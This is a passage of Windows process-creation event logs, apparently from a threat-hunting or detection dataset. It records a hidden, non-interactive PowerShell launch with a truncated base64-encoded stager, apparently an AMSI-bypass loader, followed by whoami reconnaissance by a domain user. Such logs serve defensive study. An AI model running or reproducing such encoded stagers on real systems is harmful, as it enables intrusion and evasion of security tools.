tem32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n  Cmd: \"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoP -NonI -W Hidden -enc SQBGACgAJABQAFMAVgBFAFIAUwBJAE8AbgBUAEEAQgBsAEUALgBQAFMAVgBFAFIAUwBpAG8ATgAuAE0AQQBKAE8AUgAgAC0AZwBlACAAMwApAHsAJAA2ADgANgA2AD0AWwBSAGUAZgBdAC4AQQBzAFMARQBtAEIATAB5AC4ARwBFAFQAVABZAHAARQAoACcAUwB5AHMAdABlAG0ALgBNAG\r\n----------------------------------------\r\n2026-05-06T00:00:31.256Z | evt-02380 | User: NT AUTHORITY\\NETWORK SERVICE\r\n  Img: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe\r\n  Parent: C:\\Windows\\System32\\svchost.exe\r\n  Cmd: C:\\windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding\r\n----------------------------------------\r\n2026-05-06T00:01:08.150Z | evt-03850 | User: CORP\\m.ward\r\n  Img: C:\\Windows\\System32\\whoami.exe\r\n  Parent: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n  Cmd: \"C:\\windows\\system32\\whoami.exe\"\r\n----------------------------------------\r\n"]
